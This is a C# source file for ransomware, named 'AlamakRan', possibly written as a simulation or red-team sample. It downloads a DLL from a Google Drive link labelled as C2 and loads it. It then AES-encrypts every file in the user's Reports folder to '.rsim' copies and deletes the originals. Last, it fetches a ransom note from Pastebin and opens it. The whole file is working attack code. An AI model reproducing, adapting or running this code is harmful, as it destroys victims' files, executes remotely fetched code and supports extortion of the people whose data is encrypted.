using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace AlamakRan
{
    class Program
    {
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        static void FileEncrypt(string inputFile, string password)
        {

            byte[] salt = GenerateRandomSalt();
            
            FileStream fsCrypt = new FileStream(inputFile + ".rsim", FileMode.Create);
            
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;
            
            
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            System.Threading.Thread.Sleep(1000);
            
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }
        static void FileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CFB;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    fsOut.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();
            }
        }

        [DllImport("KERNEL32.DLL", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string path);

        static string C2Download(string targetDirPath)
        {
            WebClient client = new WebClient();
            const string c2_url = "https://drive.google.com/u/0/uc?id=1kdDjokS3AaAJMmrQex9x7GK_Rj_nml5M&export=download";
            string output = targetDirPath + @"\PopCalc.dll";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.DownloadFile(c2_url, output);
            return output;
        }

        static void RansomNoteDownload(string ransomNote)
        {
            WebClient client = new WebClient();
            const string pastebin_url = "https://pastebin.com/dl/uDbAK17v";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.Headers.Add("referer", "https://pastebin.com");
            client.DownloadFile(pastebin_url, ransomNote);
        }

        static void Main(string[] args)
        {
            const string targetDir = "Reports";
            const string ransomNote = "ransom_note.txt";
            const string tempDir = "11";
            const string randomPassword = "";
            const string newFilename = "PopCalc.dll";
            string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string targetDirPath = userDirPath + @"\" + targetDir;
            string[] files = Directory.GetFiles(targetDirPath, "*");

            string tempDirPath = userDirPath + @"\" + tempDir;
            if (!Directory.Exists(targetDirPath))
            {
                // Precaution
                Console.WriteLine("Reports directory does not exist in USERPROFILE!!");
                Console.WriteLine("Exiting...");
                return;
            }

            Console.WriteLine("Creating temporary directory");
            Directory.CreateDirectory(tempDirPath);

            Console.WriteLine("Downloading Payload DLL");
            string downFile = C2Download(tempDirPath);

            File.Move(downFile, tempDirPath + @"\" + newFilename);
            try
            {
                IntPtr hModule = LoadLibrary(tempDirPath + @"\" + newFilename);
                Console.WriteLine("DLL loading successful");
            }
            catch
            {
                Console.WriteLine("Exception Occured during DLL loading.");

            }

            Console.WriteLine("Starting encryption process");
            foreach (string file in files)
            {
                FileEncrypt(file, randomPassword);
                File.Delete(file);
            }

            Console.WriteLine("Downloading ransom note from pastebin.");
            RansomNoteDownload(ransomNote);

            Process.Start("notepad.exe", ransomNote);

            //--------------------------------------------------------------------------------------------------------------
            //Console.WriteLine("Starting decryption process");
            //foreach (string file in files)
            //{
            //    FileDecrypt(file, targetDirPath + "\\Decrypted.txt", randomPassword);
            //    File.Delete(file);
            //}
        }
    }
}
